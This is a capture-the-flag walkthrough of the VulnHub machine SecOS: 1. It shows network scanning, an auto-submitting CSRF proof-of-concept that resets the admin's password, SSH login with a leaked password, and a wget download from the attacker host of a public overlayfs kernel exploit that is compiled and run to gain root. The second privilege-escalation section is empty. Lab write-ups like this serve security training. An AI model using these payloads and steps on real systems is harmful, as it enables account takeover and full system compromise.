# SECOS: 1

## Get VM IP :

```bash
root@kali: nmap -sn 192.168.127.0/24

Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 04:16 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00061s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.137
Host is up (0.00040s latency).
MAC Address: 00:0C:29:4B:BB:8D (VMware)
Nmap scan report for 192.168.127.254
Host is up (0.00025s latency).
MAC Address: 00:50:56:F4:78:0D (VMware)
Nmap scan report for 192.168.127.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.58 seconds
```

The IP address is `192.168.127.137`, let's enumerate it.

## Enumeration

```bash
root@kali: nmap -sV -sC 192.168.127.137 -oN fulscan

Nmap scan report for 192.168.127.137
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
|   256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
|_  256 a1:77:7b:f2:31:0b:81:ce:f2:09:47:06:e6:b0:80:fa (ED25519)
8081/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Web App
MAC Address: 00:0C:29:4B:BB:8D (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ports `22` and `8081` is open, so lets begin navigating the site.

in the first page we see a message and menue above :

![mainpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/42697f15-e96d-47f2-921d-062fa3897420)

fuzzing and directory brute forcing leads to nothing interesting except `/hint` directory which shows some hints :

![hint](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8400e744-51ef-4248-838f-4c6611211d41)

it is abvious that :
- admin will run the service locally on 127.0.0.1
- it says CSRF meaning we should look for it
- and the regex is for finding URL

gathering the above information we begin our work.

i signed up for an account : `myacc:123`

three new functionality appears after loggin in :

![afterlogin](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5a75cc52-f54e-4473-995e-d0106d3b9ffc)

if we check the `change password` we clearly see that is it vulnerable to CSRF attack because it meets 3 conditions :

- it is state changing
- it uses cookie for sessions
- it has no protection like CSRF token

keep it in mind we explore the `Messages` and `send message` functionality which we can send message to other users

and other users are listed in `users` menu :

![users](https://github.com/Git-K3rnel/VulnHub/assets/127470407/94484819-71ec-4ec1-82de-8f7342272aa3)

we see that user `spiderman` is administrator so we should some how try to reach his account.

## Gaining Shell

since we have CSRF vulnerability and can send message to spiderman we create a CSRF POC and send a link to spiderman (remember that admin will run service locally)

```html
<html>
  <body>
    <form action="http://127.0.0.1:8081/change-password" method="POST">
      <input type="hidden" name="password" value="123" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

put the aboove code in `visit.html` file and host it with python webserver :

```bash
root@kali: python -m http.server 80
```

send the link in message to spiderman : 

![sendmessage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/3155e9d5-b513-4e9c-9eaa-520166e05c8f)

after sending message and waiting afew seconds we expect that spiderman password would change to `123` :

```bash
root@kali: python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.127.137 - - [09/Sep/2023 05:23:01] "GET /visit.html HTTP/1.1" 200 -
```
yes we got a request it means spiderman should have our provided password.

we logout with out account and login with spiderman and password 123 and navigate to messages menu :

![spidermessage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/05b17044-239b-4c20-8f31-ef5f9222da8b)

we see here our message and `pirate` user message that mentions the spiderman password -> `CrazyPassword!`

all we need now is to SSH to machine with `spiderman:CrazyPassword!` :

![ssh](https://github.com/Git-K3rnel/VulnHub/assets/127470407/e3053b96-eb19-4413-8f95-581d215c798a)

## Privilege Escalation Method 1

if we check the linux kernel version we see the information below :

```bash
spiderman@SecOS-1:~$ uname -a
Linux SecOS-1 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 i686 i686 GNU/Linux

spiderman@SecOS-1:~$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="14.04, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

we use `searchsploit` to find any kernel exploit for this version :

```bash
root@kali: searchsploit kernel 3.13
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation   | linux/local/37292.c
```

our version meets exactly with this exploit we download this exploit and upload it on the victim on `/tmp` directory

compile it on victim :

```bash
spiderman@SecOS-1:~$ cd /tmp
spiderman@SecOS-1:/tmp$ wget http://192.168.127.128/exp.c
Connecting to 192.168.127.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: ‘exp.c’

100%[===============================================================================================>] 4,968       11.6KB/s   in 0.4s   

2023-09-09 15:02:58 (11.6 KB/s) - ‘exp.c’ saved [4968/4968]

spiderman@SecOS-1:/tmp~$ gcc exp.c
spiderman@SecOS-1:/tmp$ ls
a.out  exp.c  mongodb-27017.sock
spiderman@SecOS-1:/tmp$ ./a.out 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(spiderman)
```

yes, we got root here and can look at `/root/flag.txt` directory :

```bash
# cat /root/flag.txt
Hey,

Congrats, you did it ! 

The flag for this first (VM) is: MickeyMustNotDie.
Keep this flag because it will be needed for the next VM.

If you liked the Web application, the code is available on Github. 
(https://github.com/PaulSec/VNWA)

There should be more VMs to come in the next few weeks/months.

Twitter: @PaulWebSec
GitHub : PaulSec
```

## Privilege Escalation Method 2




